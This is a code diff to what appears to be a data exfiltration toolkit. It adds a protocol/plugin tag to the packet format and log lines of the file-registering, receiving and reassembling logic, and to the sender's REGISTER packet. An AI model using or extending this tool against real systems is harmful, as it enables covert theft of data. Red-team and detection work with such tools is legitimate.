@@ -202,7 +202,8 @@ class Exfiltration(object):
 
     def register_file(self, message):
         global files
-        jobid = message[0]
+        jobid = message[0].split('|')[0]
+        proto = message[0].split('|')[1]
         if jobid not in files:
             f = {}
             f['checksum'] = message[3].lower()
@@ -210,15 +211,15 @@ class Exfiltration(object):
             f['data'] = {}
             f['packets_len'] = -1
             files[jobid] = f
-            ok(f"[{jobid}] REGISTER packet for file {f['filename']} with checksum {f['checksum']}")
+            ok(f"[{proto}][{jobid}] REGISTER packet for file {f['filename']} with checksum {f['checksum']}")
             if jobid in files['pending']:
-                warning(f"[{jobid}] Found old pending data, parsing now...")
+                warning(f"[{proto}][{jobid}] Found old pending data, parsing now...")
                 for _ in range(len(files['pending'][jobid])):
                     self.process_data(files['pending'][jobid].pop())
                 if len(files['pending'][jobid]) == 0:
                         del files['pending'][jobid]
         else:
-            warning(f"[{jobid}] REGISTER packet received, but it's a duplicate, ignoring...")
+            warning(f"[{proto}][{jobid}] REGISTER packet received, but it's a duplicate, ignoring...")
 
     def retrieve_file(self, jobid):
         global files
@@ -268,8 +269,9 @@ class Exfiltration(object):
             if (message.count("|!|") >= 2):
                 rcvd_bytes=len(message)
                 message = message.split("|!|")
-                jobid = message[0]
-                info(f"[{jobid}] Received {rcvd_bytes} bytes")
+                jobid = message[0].split('|')[0]
+                proto = message[0].split('|')[1]
+                info(f"[{proto}][{jobid}] Received {rcvd_bytes} bytes")
 
                 # register packet
                 if (message[2] == "REGISTER"):
@@ -277,32 +279,32 @@ class Exfiltration(object):
                 # done packet
                 elif (message[2] == "DONE"):
                     if jobid not in files:
-                        warning(f"[{jobid}][!] received DONE packet for unknown JOBID! Storing as pending.")
+                        warning(f"[{proto}][{jobid}][!] received DONE packet for unknown JOBID! Storing as pending.")
                         self.store_pending_data(jobid, data)
                         return
                     files[jobid]['packets_len'] = int(message[1])
                     #Check if all packets have arrived
                     if files[jobid]['packets_len'] == len(files[jobid]['data']):
-                        warning(f"[{jobid}][!] DONE packet received")
+                        ok(f"[{proto}][{jobid}][!] DONE packet received")
                         self.retrieve_file(jobid)
                     else:
-                        warning(f"[{jobid}][!] Received the last packet, but some are still missing. Waiting for the rest...")
+                        warning(f"[{proto}][{jobid}][!] Received the last packet, but some are still missing. Waiting for the rest...")
                 # data packet
                 else:
                     packet_nr = int(message[1])
                     # making sure there's a jobid for this file
                     if (jobid in files and packet_nr not in files[jobid]['data']):
-                        info(f"[{jobid}] DATA packet #{packet_nr} received")
+                        info(f"[{proto}][{jobid}] DATA packet #{packet_nr} received")
                         files[jobid]['data'][packet_nr] = ''.join(message[2:])
                         #In case this packet was the last missing one
                         if files[jobid]['packets_len'] == len(files[jobid]['data']):
-                            warning(f"[{jobid}] last DATA packet received, reconstructing file")
+                            warning(f"[{proto}][{jobid}] last DATA packet received, reconstructing file")
                             self.retrieve_file(jobid)
                     elif jobid in files and packet_nr in files[jobid]['data']:
-                        warning(f"[{jobid}] DUPLICATE DATA file received, ignoring.")
+                        warning(f"[{proto}][{jobid}] DUPLICATE DATA file received, ignoring.")
                     else:
                         self.store_pending_data(jobid, data)
-                        warning(f"[{jobid}][!] received DATA packet for unknown JOBID! Storing as pending.")
+                        warning(f"[{proto}][{jobid}][!] received DATA packet for unknown JOBID! Storing as pending.")
         except Exception:
             traceback.print_exc()
             raise
@@ -343,8 +345,8 @@ class ExfiltrateFile(threading.Thread):
         ok("Using {0} as transport method".format(plugin_name))
 
         warning("[!] Registering packet for the file")
-        data = "%s|!|%s.%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send), plugin_name, self.checksum)
+        data = "%s|%s|!|%s.%s|!|REGISTER|!|%s" % (
+            self.jobid, plugin_name, os.path.basename(self.file_to_send), plugin_name, self.checksum)
         plugin_send_function(data)
 
         time_to_sleep = randint(1, MAX_TIME_SLEEP)
